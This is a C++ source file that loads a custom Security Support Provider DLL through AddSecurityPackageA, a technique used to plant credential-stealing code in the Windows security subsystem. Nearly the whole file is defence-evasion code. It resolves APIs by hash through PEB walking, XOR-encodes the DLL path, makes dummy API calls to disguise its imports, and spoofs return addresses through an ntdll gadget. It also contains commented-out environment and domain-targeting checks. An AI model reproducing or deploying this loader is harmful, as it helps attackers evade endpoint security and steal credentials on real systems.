// Classic SSP loader — providerexperiments/LoadingofSSPClassic

#define WIN32_NO_STATUS
#define SECURITY_WIN32
//#include <winternl.h>
#include "structs.h"
#include "sandbox_env.h"
#include <windows.h>
#include <sspi.h>
#pragma comment(lib, "Secur32.lib")
#include <stdio.h>
#include <tlhelp32.h>
#include <stddef.h>
#include <iostream>
#include <vector>
#include <locale>
#include <codecvt>
#include <psapi.h>  // For EnumProcessModules and related functions
#include <lm.h>
#include <string.h>
#pragma comment(lib, "Netapi32.lib")


#define HASHA(API) (HashStringJenkinsOneAtATime32BitA((PCHAR) API))
#define HASHW(API) (HashStringJenkinsOneAtATime32BitW((PWCHAR) API))

#define RETVAL_TAG 0xAABBCCDD

#define secur32ha 0x23e1f736
#define SSPICLIHA 0xb265b316
#define addsecpackageHash 0xac7943c7
#define ntdllHa 0x4898F593
#define LoadLibraryHA	0x19F0EEAF
#define kernel32HA		0x367DC15A
#define GetProcaddressHA 0x84C96E3E

#define RANGE 128

typedef SECURITY_STATUS(SEC_ENTRY*  AddSecurityPackageA_t) (
	LPSTR pszPackageName,
	PSECURITY_PACKAGE_OPTIONS pOptions
	);

typedef FARPROC(WINAPI* GetProcAddress_t)(
	HMODULE hModule,
	LPCSTR  lpFuncName
	);

typedef HMODULE(WINAPI* LoadLibraryA_t)(
	LPCSTR lpLibFileName
	);

#define INITIAL_SEED	7

extern "C" PVOID ChangeRetAddress(PVOID Function, SIZE_T nArgs, PVOID Gadget, ...);


static BOOL GetGadget(PBYTE Module, LPCSTR GadgetBytes, PVOID* GadgetAddr)
{
	if (!GadgetAddr || !Module || !GadgetBytes)
		return FALSE;

	PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)Module;
	if (dos->e_magic != IMAGE_DOS_SIGNATURE)
		return FALSE;

	PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(Module + dos->e_lfanew);
	if (nt->Signature != IMAGE_NT_SIGNATURE)
		return FALSE;

	PVOID base = Module + IMAGE_FIRST_SECTION(nt)->VirtualAddress;
	DWORD size = IMAGE_FIRST_SECTION(nt)->SizeOfRawData;
	SIZE_T szGt = strlen(GadgetBytes);

	for (PBYTE current = (PBYTE)base; current <= (PBYTE)base + size - szGt; current++) {
		if (!memcmp(current, GadgetBytes, szGt)) {
			*GadgetAddr = current;
			return TRUE;
		}
	}

	return FALSE;
}


int zufall(void)
{
	return '0' * -43546 +
		__TIME__[7] * 1 +
		__TIME__[6] * 10 +
		__TIME__[4] * 60 +
		__TIME__[3] * 600 +
		__TIME__[1] * 3600 +
		__TIME__[0] * 36000;
}





// A dummy function that makes the if-statement in 'IatCamouflage' interesting for the compiler
PVOID helferlein(PVOID* ppAddress) {

	PVOID pAddress = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0xFF);
	if (!pAddress)
		return NULL;

	// setting the first 4 bytes in pAddress to be equal to a random number (less than 255)
	*(int*)pAddress = zufall() % 0xFF;
	
	// saving the base address by pointer 
	*ppAddress = pAddress;

	// returning it 
	return pAddress;
}


static BOOL DomainNameContainsKik(LPCWSTR domain)
{
	if (domain == NULL || domain[0] == L'\0')
		return FALSE;

	for (LPCWSTR p = domain; *p != L'\0'; ++p) {
		if (_wcsnicmp(p, L"company", 7) == 0)
			return TRUE;
	}
	return FALSE;
}

static BOOL IsJoinedToKikDomain(void)
{
	LPWSTR pszDomain = NULL;
	NETSETUP_JOIN_STATUS joinStatus = NetSetupUnknownStatus;
	BOOL onKik = FALSE;

	if (NetGetJoinInformation(NULL, &pszDomain, &joinStatus) != NERR_Success)
		return FALSE;

	wprintf(L"domain: %s (joinStatus=%d)\n", pszDomain ? pszDomain : L"(null)", (int)joinStatus);

	if (joinStatus == NetSetupDomainName && pszDomain != NULL)
		onKik = DomainNameContainsKik(pszDomain);

	if (pszDomain != NULL)
		NetApiBufferFree(pszDomain);

	return onKik;
}


extern "C" __declspec(dllexport) DWORD WINAPI getlasterror_exp(void) { return GetLastError(); }
extern "C" __declspec(dllexport) DWORD WINAPI setcriticalsectionspincount_exp(LPCRITICAL_SECTION lpCriticalSection, DWORD dwSpinCount) { return SetCriticalSectionSpinCount(lpCriticalSection, dwSpinCount); }
extern "C" __declspec(dllexport) DWORD WINAPI getwindowcontexthelpid_exp(HWND hwnd) { return GetWindowContextHelpId(hwnd); }
extern "C" __declspec(dllexport) LONG_PTR WINAPI getwindowlongptrw_exp(HWND hWnd, int nIndex) { return GetWindowLongPtrW(hWnd, nIndex); }
extern "C" __declspec(dllexport) BOOL WINAPI showwindow_exp(HWND hWnd, int nCmdShow) { return ShowWindow(hWnd, nCmdShow); }
extern "C" __declspec(dllexport) BOOL WINAPI setforegroundwindow_exp(HWND hWnd) { return SetForegroundWindow(hWnd); }
extern "C" __declspec(dllexport) DWORD WINAPI gettickcount_exp(void) { return GetTickCount(); }
extern "C" __declspec(dllexport) DWORD WINAPI getcurrentprocessid_exp(void) { return GetCurrentProcessId(); }
extern "C" __declspec(dllexport) DWORD WINAPI getcurrentthreadid_exp(void) { return GetCurrentThreadId(); }
extern "C" __declspec(dllexport) LPSTR WINAPI getcommandlinea_exp(void) { return GetCommandLineA(); }
extern "C" __declspec(dllexport) LONG WINAPI getmessagepos_exp(void) { return GetMessagePos(); }
extern "C" __declspec(dllexport) LONG WINAPI getmessagetime_exp(void) { return GetMessageTime(); }
extern "C" __declspec(dllexport) UINT WINAPI getcaretblinktime_exp(void) { return GetCaretBlinkTime(); }
extern "C" __declspec(dllexport) UINT WINAPI getdoubleclicktime_exp(void) { return GetDoubleClickTime(); }
extern "C" __declspec(dllexport) HWND WINAPI getactivewindow_exp(void) { return GetActiveWindow(); }
extern "C" __declspec(dllexport) HWND WINAPI getcapture_exp(void) { return GetCapture(); }
extern "C" __declspec(dllexport) HWND WINAPI getfocus_exp(void) { return GetFocus(); }
extern "C" __declspec(dllexport) HWND WINAPI getdesktopwindow_exp(void) { return GetDesktopWindow(); }
extern "C" __declspec(dllexport) HWND WINAPI getforegroundwindow_exp(void) { return GetForegroundWindow(); }
extern "C" __declspec(dllexport) HWND WINAPI getclipboardowner_exp(void) { return GetClipboardOwner(); }
extern "C" __declspec(dllexport) HWND WINAPI getopenclipboardwindow_exp(void) { return GetOpenClipboardWindow(); }
extern "C" __declspec(dllexport) DWORD WINAPI getclipboardsequencenumber_exp(void) { return GetClipboardSequenceNumber(); }
extern "C" __declspec(dllexport) BOOL WINAPI getinputstate_exp(void) { return GetInputState(); }
extern "C" __declspec(dllexport) DWORD WINAPI getcurrenttime_exp(void) { return GetCurrentTime(); }
extern "C" __declspec(dllexport) HKL WINAPI getkeyboardlayout_exp(DWORD idThread) { return GetKeyboardLayout(idThread); }
extern "C" __declspec(dllexport) HANDLE WINAPI getprocessheap_exp(void) { return GetProcessHeap(); }
extern "C" __declspec(dllexport) UINT WINAPI getacp_exp(void) { return GetACP(); }
extern "C" __declspec(dllexport) UINT WINAPI getoemcp_exp(void) { return GetOEMCP(); }
extern "C" __declspec(dllexport) int WINAPI getsystemmetrics_exp(int nIndex) { return GetSystemMetrics(nIndex); }
extern "C" __declspec(dllexport) BOOL WINAPI isdialogmessagew_exp(HWND hDlg, LPMSG lpMsg) { return IsDialogMessageW(hDlg, lpMsg); }


// Function that imports WinAPIs but never uses them
VOID keineaufruhr() {

	//if (!IsJoinedToKikDomain())
	//	return;

	PVOID		pAddress = NULL;
	int* A = (int*)helferlein(&pAddress);

	// Impossible if-statement that will never run
	if (*A > 350) {
		PSecurityFunctionTableA t = InitSecurityInterfaceA();
		(void)t;
		// some random whitelisted WinAPIs
		int i = (int)getlasterror_exp();
		i = (int)setcriticalsectionspincount_exp(NULL, 0);
		i = (int)getwindowcontexthelpid_exp(NULL);
		i = (int)getwindowlongptrw_exp(NULL, 0);
		i = (int)showwindow_exp(NULL, 0);
		i = (int)setforegroundwindow_exp(NULL);
		i = (int)gettickcount_exp();
		i = (int)getcurrentprocessid_exp();
		i = (int)getcurrentthreadid_exp();
		i = (int)getlasterror_exp();
		i = (int)(INT_PTR)getcommandlinea_exp();
		i = (int)getmessagepos_exp();
		i = (int)getmessagetime_exp();
		i = (int)getcaretblinktime_exp();
		i = (int)getdoubleclicktime_exp();
		i = (int)(INT_PTR)getactivewindow_exp();
		i = (int)(INT_PTR)getcapture_exp();
		i = (int)(INT_PTR)getfocus_exp();
		i = (int)(INT_PTR)getdesktopwindow_exp();
		i = (int)(INT_PTR)getforegroundwindow_exp();
		i = (int)(INT_PTR)getclipboardowner_exp();
		i = (int)(INT_PTR)getopenclipboardwindow_exp();
		i = (int)getclipboardsequencenumber_exp();
		i = (int)getinputstate_exp();
		i = (int)getcurrenttime_exp();
		i = (int)(INT_PTR)getkeyboardlayout_exp(0);
		i = (int)(INT_PTR)getprocessheap_exp();
		i = (int)getacp_exp();
		i = (int)getoemcp_exp();
		i = getsystemmetrics_exp(0);
		i = (int)isdialogmessagew_exp(NULL, NULL);
	}

	// Freeing the buffer allocated in 'Helper'
	HeapFree(GetProcessHeap(), 0, pAddress);
}


UINT32 jingleHAA(_In_ PCHAR String)
{
	SIZE_T Index = 0;
	UINT32 wert = 0;
	SIZE_T Length = lstrlenA(String);

	while (Index != Length)
	{
		wert += String[Index++];
		wert += wert << INITIAL_SEED;
		wert ^= wert >> 6;
	}

	wert += wert << 3;
	wert ^= wert >> 11;
	wert += wert << 15;

	return wert;
}


UINT32 jingleHAW(_In_ PWCHAR String)
{
	SIZE_T Index = 0;
	UINT32 wert = 0;
	SIZE_T Length = lstrlenW(String);

	while (Index != Length)
	{
		wert += String[Index++];
		wert += wert << INITIAL_SEED;
		wert ^= wert >> 6;
	}

	wert += wert << 3;
	wert ^= wert >> 11;
	wert += wert << 15;

	return wert;
}


// HASHA pass the input string to Hasher1 
// HASHW pass the input string to Hasher2
#define makerA(API) (jingleHAA((PCHAR) API))
#define makerW(API) (jingleHAW((PWCHAR) API))


/*
-	dwModuleNameHash is the hash of the dll name to get the handle of.
	the name should be hashed in *UPPER* case letters - capitalized;

	HASHA("NTDLL.DLL") - HASHA("USER32.DLL") - HASHA("KERNEL32.DLL")
*/
HMODULE GMH(DWORD dwModuleNameHash) {

	if (dwModuleNameHash == NULL)
		return NULL;

#ifdef _WIN64
	PPEB_orig					pPeb = (PEB_orig*)(__readgsqword(0x60));
#elif _WIN32
	PPEB_ORIG					pPeb = (PEB_orig*)(__readfsdword(0x30));
#endif

	PPEB_LDR_DATA			pLdr = (PPEB_LDR_DATA)(pPeb->LoaderData);
	PLDR_DATA_TABLE_ENTRY_orig	pDte = (PLDR_DATA_TABLE_ENTRY_orig)(pLdr->InMemoryOrderModuleList.Flink);

	while (pDte) {

		if (pDte->FullDllName.Length != NULL && pDte->FullDllName.Length < MAX_PATH) {

			// converting `FullDllName.Buffer` to upper case string 
			CHAR UpperCaseDllName[MAX_PATH];

			DWORD i = 0;
			while (pDte->FullDllName.Buffer[i]) {
				UpperCaseDllName[i] = (CHAR)toupper(pDte->FullDllName.Buffer[i]);
				i++;
			}
			UpperCaseDllName[i] = '\0';
			//printf(UpperCaseDllName);
			// hashing `UpperCaseDllName` and comparing the hash value to that's of the input `dwModuleNameHash`
			if (makerA(UpperCaseDllName) == dwModuleNameHash)
				return (HMODULE)pDte->Reserved2[0];

		}
		else {
			break;
		}

		pDte = *(PLDR_DATA_TABLE_ENTRY_orig*)(pDte);
	}

	return NULL;
}

/*
-	`dwApiNameHash` is the hash value of the function name
	of the function specified to get it's address.

-	The function is exported by a dll of a handle `hModule`
	(`hModule` is returned by GetModuleHandleH)
*/

FARPROC GPAH(HMODULE hModule, DWORD dwApiNameHash) {

	if (hModule == NULL || dwApiNameHash == NULL)
		return NULL;

	PBYTE pBase = (PBYTE)hModule;

	PIMAGE_DOS_HEADER			pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;
	if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
		return NULL;

	PIMAGE_NT_HEADERS			pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		return NULL;

	IMAGE_OPTIONAL_HEADER		ImgOptHdr = pImgNtHdrs->OptionalHeader;

	PIMAGE_EXPORT_DIRECTORY		pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	PDWORD						FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);
	PDWORD						FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);
	PWORD						FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);

	for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {
		CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);
		PVOID	pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);
		//printf(pFunctionName);
		// hashing every function name `pFunctionName`
		// if both hashes are equal, then we found the function we want 
		if (dwApiNameHash == makerA(pFunctionName)) {
			printf(pFunctionName);
			return (FARPROC)pFunctionAddress;
		}
	}

	return NULL;
}



// Function to XOR encode/decode a string
void doTheMath3G(char* str, int len, char key[3]) {
	for (int i = 0; i < len; i++) {
		str[i] ^= key[i % 3];
	}
}


char key3G[] = { 0x67, 0xDD, 0xFE };


static void DbgPrintExportBytes(const char* label, FARPROC pFn)
{
	if (!pFn) {
		printf("[dbg] %s: (null)\n", label);
		return;
	}

	unsigned char* b = (unsigned char*)pFn;
	printf("[dbg] %s bytes:", label);
	for (int i = 0; i < 8; i++)
		printf(" %02X", b[i]);
	printf("\n");

	if (b[0] == 0xE9)
		printf("[dbg] %s: rel32 JMP at entry (possible hook)\n", label);
	else if (b[0] == 0xFF && b[1] == 0x25)
		printf("[dbg] %s: indirect JMP at entry (possible hook/forwarder)\n", label);
	else if ((b[0] == 0x48 && (b[1] == 0x89 || b[1] == 0x83)) ||
		(b[0] == 0x4C && b[1] == 0x8B) ||
		(b[0] == 0x40 && b[1] == 0x55))
		printf("[dbg] %s: normal-looking x64 prologue\n", label);
	else
		printf("[dbg] %s: unknown prologue (inspect manually)\n", label);
}


static void DbgCheckExport(HMODULE hMod, LPCSTR fnName, DWORD fnHash, FARPROC pGpath)
{
	FARPROC pGpa = GetProcAddress(hMod, fnName);

	printf("\n[dbg] export check: %s (hash 0x%08X)\n", fnName, fnHash);
	printf("[dbg] module handle:   %p\n", hMod);
	printf("[dbg] GPAH:            %p\n", pGpath);
	printf("[dbg] GetProcAddress:  %p\n", pGpa);
	printf("[dbg] addresses match: %s\n", (pGpath == pGpa) ? "yes" : "NO");

	DbgPrintExportBytes("GPAH", pGpath);
	DbgPrintExportBytes("GPA ", pGpa);
}


static VOID RunBenignDecoy(VOID)
{
	for (int i = 0; i < 5; i++)
		keineaufruhr();
}

int main()
{

	//if (!IsRealUserEnvironment()) {
		//RunBenignDecoy();
	//	return 0;
	//}
	//int a = 9;
	//if (!IsJoinedToKikDomain())
	//	return 0;

	for (int i = 0; i < 150; i++)
	{
		keineaufruhr();
	}
	/////// get the preparations fot the ark function 
// getting the handle of user32.dll using GetModuleHandleH 

	HMODULE sntdec32 = GMH(ntdllHa);
	if (sntdec32 == NULL) {
		printf("[!] Cound'nt Get Handle To ntdll \n");
		return -1;
	}

	char key = 0x67;


	char pathkatze[] = {
  0x24, 0xE7, 0xA2, 0x3B, 0x89, 0x9B, 0x0A, 0xAD, 0xA2, 0x3B,
	0x8E, 0x9B, 0x04, 0xA8, 0x8C, 0x0E, 0xA9, 0x87, 0x26, 0xB9,
	0x9A, 0x08, 0xB3, 0xD0, 0x03, 0xB1, 0x92, 0x00, 0x14
	};
	char pathsicherheit[] = {
		  0x14, 0xAE, 0x8E, 0x0E, 0xBE, 0x92, 0x0E, 0xF3, 0x9A, 0x0B,
	0xB1, 0x00, 0x00
	};


	for (int i = 0; i < 150; i++)
	{
		keineaufruhr();
	}
	
	doTheMath3G(pathkatze, sizeof(pathkatze) - 2, key3G);
	doTheMath3G(pathsicherheit, sizeof(pathsicherheit) - 2, key3G);
	printf("wholepath %s len\n", pathkatze);
	printf("sccclie %s \n" , pathsicherheit);  
	
	///// get the preparations fot the ark function 
	// getting the handle of user32.dll using GetModuleHandleH 
	HMODULE k32 = GMH(kernel32HA);
	if (k32 == NULL) {
		printf("[!] Cound'nt Get Handle To kernel32.dll \n");
		return -1;
	}
	printf(" print this shit k32 module handle  %llx ", k32);

	// getting the address of Loadlibrary function using GetProcAddressH
	LoadLibraryA_t loadlibA = (LoadLibraryA_t)GPAH(k32, LoadLibraryHA);
	if (loadlibA == NULL) {
		printf("[!] Cound'nt Find Address Of Specified Function 1\n");
		return -1;
	}
	// wait fo rinpout and attach
	printf(" print this shit loadliba module handle  %llx ", loadlibA);
	


	HMODULE SSPI = GMH(SSPICLIHA);
	printf("[!]MYSSPIACCESS %llx\n", SSPI);

	for (int i = 0; i < 150; i++)
	{
		keineaufruhr();
	}


	AddSecurityPackageA_t ASP = (AddSecurityPackageA_t)GPAH(SSPI, addsecpackageHash);
	printf("[!]ADDSECURITYPACKAGE %p\n", ASP);
	//DbgCheckExport(SSPI, "AddSecurityPackageA", addsecpackageHash, (FARPROC)ASP);
	SECURITY_PACKAGE_OPTIONS spo = {};

	for (int i = 0; i < 150; i++)
	{
		keineaufruhr();
	}
	
	// wait fo rinpout and attach
	//getchar();

	PVOID gadget = NULL;
	if (!GetGadget((PBYTE)sntdec32, "\x41\xFF\xD4", &gadget)) {
		printf("[!] Could not find call r12 gadget in ntdll\n");
		return -1;
	}
	printf("[+] call r12 gadget @ %p\n", gadget);

	// Return-address spoofed call: ChangeRetAddress(Function, nArgs, gadget, arg1, arg2, ...)
	SECURITY_STATUS ss2 = (SECURITY_STATUS)(ULONG_PTR)ChangeRetAddress(
		(PVOID)ASP,
		2,
		gadget,
		(LPSTR)pathkatze,
		&spo);
	
	
	printf(" print this shit for myload %llx ", ss2);



    //SECURITY_STATUS ss = AddSecurityPackageA((LPSTR)"C:\\Temp\\SecurityAddon.dll", &spo);
	//printf(" print this shit %llx ",ss);
	return 0;
}